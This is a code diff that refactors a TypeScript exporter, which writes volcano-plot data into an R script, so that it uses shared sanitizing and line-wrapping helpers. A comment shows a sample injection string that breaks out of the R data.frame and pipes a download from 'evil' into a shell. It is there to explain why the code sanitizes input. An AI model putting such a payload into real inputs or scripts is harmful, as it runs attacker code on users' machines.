@@ -11,28 +11,14 @@
 // like `"); system("curl evil|sh"); foo <- c("` would break out of the
 // data.frame and execute arbitrary shell when the user runs the script.
 //
-// Consumes the global helpers (sanitizeRString, sanitizeRComment,
-// formatRNumber) from shared.bundle.js the same way every other
-// reports.ts does.
+// String-builder helpers (sanitizeRString, sanitizeRComment,
+// formatRNumber, wrapRItems) are imported from `_shell/r-export` — the
+// same module heatmap/reports.ts and scatter/reports.ts use. wrapRItems
+// is the shared line-wrapping helper; it caps every emitted line at
+// R_MAX_LINE so the inlined data block stays parseable by R.
 
 import { VolcanoPoint, VOLCANO_DEFAULT_COLORS, summarize } from "./helpers";
-
-declare const sanitizeRString: (s: unknown) => string;
-declare const sanitizeRComment: (s: unknown) => string;
-declare const formatRNumber: (n: number | null | undefined) => string;
-
-// Wrap a long c(...) literal across multiple indented lines so the
-// script stays readable when the dataset has thousands of features.
-// Mirrors the helper in shared-r-export.js (kept private there).
-function wrapC(items: string[], perLine: number): string {
-  const P = perLine || 8;
-  if (items.length <= P) return "c(" + items.join(", ") + ")";
-  const lines: string[] = [];
-  for (let i = 0; i < items.length; i += P) {
-    lines.push("    " + items.slice(i, i + P).join(", "));
-  }
-  return "c(\n" + lines.join(",\n") + "\n  )";
-}
+import { sanitizeRString, sanitizeRComment, formatRNumber, wrapRItems } from "../_shell/r-export";
 
 interface BuildVolcanoRScriptArgs {
   points: VolcanoPoint[];
@@ -110,9 +96,9 @@ export function buildVolcanoRScript(args: BuildVolcanoRScriptArgs): string {
 
   // ── Data frame literal ────────────────────────────────────────────
   lines.push("df <- data.frame(");
-  lines.push("  feature = " + wrapC(featureItems, 6) + ",");
-  lines.push("  log2FC  = " + wrapC(log2fcItems, 8) + ",");
-  lines.push("  pvalue  = " + wrapC(pItems, 8) + ",");
+  lines.push("  feature = " + wrapRItems(featureItems, 6) + ",");
+  lines.push("  log2FC  = " + wrapRItems(log2fcItems, 8) + ",");
+  lines.push("  pvalue  = " + wrapRItems(pItems, 8) + ",");
   lines.push("  stringsAsFactors = FALSE");
   lines.push(")");
   lines.push("");
